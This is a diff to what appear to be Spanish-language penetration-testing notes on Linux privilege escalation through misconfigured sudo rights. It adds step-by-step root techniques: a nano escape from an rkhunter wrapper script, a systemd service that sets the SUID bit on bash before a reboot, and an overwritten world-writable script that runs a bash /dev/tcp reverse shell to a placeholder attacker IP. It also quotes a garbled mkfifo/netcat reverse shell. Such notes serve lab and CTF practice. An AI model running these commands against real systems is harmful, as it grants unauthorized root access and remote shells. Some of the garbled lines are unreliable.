@@ -345,6 +345,7 @@ NOTA:
 ```
 
 ### Fail2ban-client 
+* [Fail2ban](https://exploitnotes.org/exploit/linux/privilege-escalation/sudo/fail2ban-command.html)
 ```bash 
 ❯ sudo -l 
 # Ejecutar 'fail2ban-client' como root sin password
@@ -372,13 +373,97 @@ Paso 4:
 (root) NOPASSWD: /bin/bash /opt/rootkit.sh
 
 Paso 1:
-# Cuando miras el código si le das en read, ingresa a 'Nano'
+# Al mirar el código si escribes read, ingresaras al editor 'Nano'
+❯ cat /opt/rootkit.sh
+
+	#!/bin/bash
+	read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+	# Execute your choice
+	case $ans in
+	    versioncheck)
+	        /usr/bin/rkhunter --versioncheck ;;
+	    update)
+	        /usr/bin/rkhunter --update;;
+	    list)
+	        /usr/bin/rkhunter --list;;
+	    read)
+	        /bin/nano /root/report.txt;;
+	    *)
+	        exit;;
+	esac
+
+# Ejecutar 
 ❯ sudo bash /opt/rootkit.sh
 # Would you like to versioncheck, update, list or read the report ? 
 	read    # Cuando pregunte escribir read 
 
 Paso 2:
-# Cuando ingrese a nano
+# Al ingresar a nano
 ❯ ctrl + r y ctrl + x      # Activar la ejecución de comandos 
 ❯ reset; bash 1>&0 2>&0    # Obtener una shell como root 
+```
+
+## Reboot
+```bash 
+❯ sudo -l 
+# Ejecutar 'reboot' como root sin password
+(ALL) NOPASSWD: /usr/sbin/reboot
+
+
+Paso 1:
+❯ nano /etc/systemd/system/zeno-monitoring.service   # Modificar el ExecStart 
+❯ cat /etc/systemd/system/zeno-monitoring.service
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/bin/chmod +s /usr/bin/bash
+
+[Install]
+WantedBy=multi-user.target
+
+Paso 2:
+# Reiniciar la máquina 
+❯ sudo /usr/sbin/reboot
+
+Paso 3: 
+# cuando regrese ejecutar la shell como root
+❯ /usr/bin/bash -p 
+```
+
+## Backup 
+```bash 
+❯ sudo -l 
+# Ejecutar 'backup.pl' como root sin password
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+Paso 1: Mirar contenido y permisos 
+❯ cat /home/itguy/backup.pl    
+	#!/usr/bin/perl 
+	system("sh", "/etc/copy.sh");
+
+❯ ls -la /home/itguy/backup.pl
+	-rw-r--r-x root root /home/itguy/backup.pl
+
+
+❯ cat /etc/copy.sh    
+	rm /tmp/f;mkfifo /tmpf;cat /tmp/fl/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+❯ ls -la /etc/copy.sh 
+	-rw-r--rwx root root /etc/copy.sh
+
+
+Paso 2: 
+# Como otros pueden modificar se procede a modificarlo 
+❯ echo "bash -c 'exec bash -i &>/dev/tcp/IP_Kali/443 <&1'" > /etc/copy.sh
+
+Paso 3:
+# Ponerse en escucha en Kali 
+❯ nrlwrap nc -nlvp 443 
+
+Paso 4:
+# Ejecutar el script 
+❯ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
